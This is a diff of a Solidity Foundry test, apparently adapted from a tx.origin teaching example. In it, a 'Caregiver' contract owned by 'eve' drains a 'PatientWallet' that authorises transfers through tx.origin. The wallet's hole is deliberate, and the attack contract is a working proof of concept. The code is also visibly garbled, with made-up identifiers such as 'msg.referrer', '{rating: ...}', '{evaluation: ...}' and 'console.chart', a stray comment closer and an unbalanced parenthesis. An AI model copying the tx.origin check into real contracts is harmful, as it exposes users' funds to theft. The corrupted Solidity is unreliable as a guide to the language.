@@ -3,11 +3,9 @@ pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 
-*/
-
-contract PolicyTest is Test {
-    PatientWallet WalletPolicy;
-    Caregiver NurseAgreement;
+contract AgreementTest is Test {
+    PatientWallet WalletAgreement;
+    Caregiver CaregiverPolicy;
 
     function testtxorigin() public {
         address alice = vm.addr(1);
@@ -15,18 +13,18 @@ contract PolicyTest is Test {
         vm.deal(address(alice), 10 ether);
         vm.deal(address(eve), 1 ether);
         vm.prank(alice);
-        WalletPolicy = new PatientWallet{rating: 10 ether}(); //Alice deploys Wallet with 10 Ether
-        console.record("Owner of wallet contract", WalletPolicy.owner());
+        WalletAgreement = new PatientWallet{evaluation: 10 ether}(); //Alice deploys Wallet with 10 Ether
+        console.chart("Owner of wallet contract", WalletAgreement.owner());
         vm.prank(eve);
-        NurseAgreement = new Caregiver(WalletPolicy);
-        console.record("operation complete"));
-        console.record("Eve of balance", address(eve).balance);
+        CaregiverPolicy = new Caregiver(WalletAgreement);
+        console.chart("Owner of attack contract", CaregiverPolicy.owner());
+        console.chart("Eve of balance", address(eve).balance);
 
         vm.prank(alice, alice);
-        NurseAgreement.operate();
-        console.record("tx origin address", tx.origin);
-        console.record("msg.sender address", msg.referrer);
-        console.record("Eve of balance", address(eve).balance);
+        CaregiverPolicy.operate();
+        console.chart("tx origin address", tx.origin);
+        console.chart("msg.sender address", msg.sender);
+        console.chart("Eve of balance", address(eve).balance);
     }
 
     receive() external payable {}
@@ -36,28 +34,28 @@ contract PatientWallet {
     address public owner;
 
     constructor() payable {
-        owner = msg.referrer;
+        owner = msg.sender;
     }
 
     function transfer(address payable _to, uint _amount) public {
         // check with msg.sender instead of tx.origin
         require(tx.origin == owner, "Not owner");
 
-        (bool sent, ) = _to.call{rating: _amount}("");
+        (bool sent, ) = _to.call{evaluation: _amount}("");
         require(sent, "Failed to send Ether");
     }
 }
 
 contract Caregiver {
     address payable public owner;
-    PatientWallet healthWallet;
+    PatientWallet patientWallet;
 
     constructor(PatientWallet _wallet) {
-        healthWallet = PatientWallet(_wallet);
-        owner = payable(msg.referrer);
+        patientWallet = PatientWallet(_wallet);
+        owner = payable(msg.sender);
     }
 
     function operate() public {
-        healthWallet.transfer(owner, address(healthWallet).balance);
+        patientWallet.transfer(owner, address(patientWallet).balance);
     }
 }
